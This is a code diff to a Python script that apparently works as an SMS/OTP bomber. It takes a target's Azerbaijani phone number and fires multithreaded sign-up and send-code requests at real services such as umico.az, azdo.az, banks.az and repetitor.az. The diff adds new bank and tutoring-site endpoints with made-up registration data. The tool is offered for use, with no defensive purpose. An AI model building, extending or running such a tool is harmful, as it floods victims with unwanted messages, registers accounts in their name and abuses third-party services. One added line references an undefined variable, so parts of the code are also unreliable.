@@ -83,8 +83,6 @@ def main():
     requests_per_thread = total_requests // threads
     extra_requests = total_requests % threads
     
-    
-
     phone_number = input("Nömrə +994")
     
     umico_url = "https://customer.umico.az/v2/clients/account/sign-up"
@@ -226,7 +224,43 @@ def main():
     azdr_url = f"https://api.azdo.az/api/v1/registrations/{registration_id}/send-otp"
     azdr_headers = {}
     azdr_data = {}
-
+    
+    banks_url = "https://api.banks.az/v1/auth/set-phone"
+    banks_headers = {}
+    banks_data = {
+        "phone": f"994{phone_number}",
+        "lang":"en"
+    }
+    
+    bankr_url = "https://api.banks.az/v1/auth/register"
+    bankr_headers = {}
+    bankr_data = {
+        "phone": f"994{phone_number}",
+        "username": f"roqevbslr{phone_number}tgkvs",
+        "name":"reidglsberin",
+        "lastname":"bfertonuqecbakr",
+        "email": f"frt.rsu{phone_number}rt@gmail.com",
+        "lang":"en"
+    }
+    
+    reptr_url = "https://repetitor.az/join/registration"
+    reptr_headers = {}
+    reptr_data = {
+        "role":"2",
+        "first_name":"gerodnfsv",
+        "last_name":"verkdlsercom",
+        "prefix": f"{phone_number[0:2]}",
+        "tel": f"{phone_number[2:5]} {phone_number[5:7]} {phone_number[7:9]}",
+        "email": f"qelfv.pza{phone_number}fk%40gmail.com",
+        "password":"a%2Cg%7Dz%257RAw27QRJ"
+    }
+    reptor_url = "https://repetitor.az/login/request_code"
+    reptor_headers = {}
+    reptor_data = {
+        "prefix": f"{phone_number[0:2]}",
+        "tel": f"{phone_number[2:5]} {phone_number[5:7]} {phone_number[7:9]}"
+    }
+    
     thread_list = []
 
     for i in range(threads):
@@ -251,6 +285,10 @@ def main():
             osim_thread = threading.Thread(target=send_post_request, args=(osim_url, osim_headers, osim_data, "osim", i+1, requests_per_thread + 1))
             azdo_thread = threading.Thread(target=send_post_request, args=(azdo_url, azdo_headers, azdo_data, "azdo", i+1, requests_per_thread + 1))
             azdr_thread = threading.Thread(target=send_put_request, args=(azdr_url, azdr_headers, azdr_data, "azdr", i+1, requests_per_thread + 1))
+            banks_thread = threading.Thread(target=send_post_request, args=(banks_url, banka_headers, banks_data, "banks", i+1, requests_per_thread + 1))
+            bankr_thread = threading.Thread(target=send_post_request, args=(bankr_url, banka_headers, bankr_data, "bankr", i+1, requests_per_thread + 1))
+            reptr_thread = threading.Thread(target=send_post_request, args=(reptr_url, reptr_headers, reptr_data, "reptr", i+1, requests_per_thread + 1, False))
+            reptor_thread = threading.Thread(target=send_post_request, args=(reptor_url, reptor_headers, reptor_data, "reptor", i+1, requests_per_thread + 1, False))
         else:
             umico_thread = threading.Thread(target=send_post_request, args=(umico_url, umico_headers, umico_data, "umico", i+1, requests_per_thread))
             umireg_thread = threading.Thread(target=send_get_request, args=(umireg_url, umireg_headers, umireg_data, "umireg", i+1, requests_per_thread))
@@ -272,6 +310,10 @@ def main():
             osim_thread = threading.Thread(target=send_post_request, args=(osim_url, osim_headers, osim_data, "osim", i+1, requests_per_thread))
             azdo_thread = threading.Thread(target=send_post_request, args=(azdo_url, azdo_headers, azdo_data, "azdo", i+1, requests_per_thread))
             azdr_thread = threading.Thread(target=send_put_request, args=(azdr_url, azdr_headers, azdr_data, "azdr", i+1, requests_per_thread))
+            banks_thread = threading.Thread(target=send_post_request, args=(banks_url, banks_headers, banks_data, "banks", i+1, requests_per_thread))
+            bankr_thread = threading.Thread(target=send_post_request, args=(bankr_url, bankr_headers, bankr_data, "bankr", i+1, requests_per_thread))
+            reptr_thread = threading.Thread(target=send_post_request, args=(reptr_url, reptr_headers, reptr_data, "reptr", i+1, requests_per_thread, False))
+            reptor_thread = threading.Thread(target=send_post_request, args=(reptor_url, reptor_headers, reptor_data, "reptor", i+1, requests_per_thread, False))
         
         thread_list.append(umico_thread)
         thread_list.append(umireg_thread)
@@ -293,6 +335,10 @@ def main():
         thread_list.append(osim_thread)
         thread_list.append(azdo_thread)
         thread_list.append(azdr_thread)
+        thread_list.append(banks_thread)
+        thread_list.append(bankr_thread)
+        thread_list.append(reptr_thread)
+        thread_list.append(reptor_thread)
         umico_thread.start()
         umireg_thread.start()
         million_thread.start()
@@ -313,6 +359,10 @@ def main():
         osim_thread.start()
         azdo_thread.start()
         azdr_thread.start()
+        banks_thread.start()
+        bankr_thread.start()
+        reptr_thread.start()
+        reptor_thread.start()
 
     for thread in thread_list:
         thread.join()
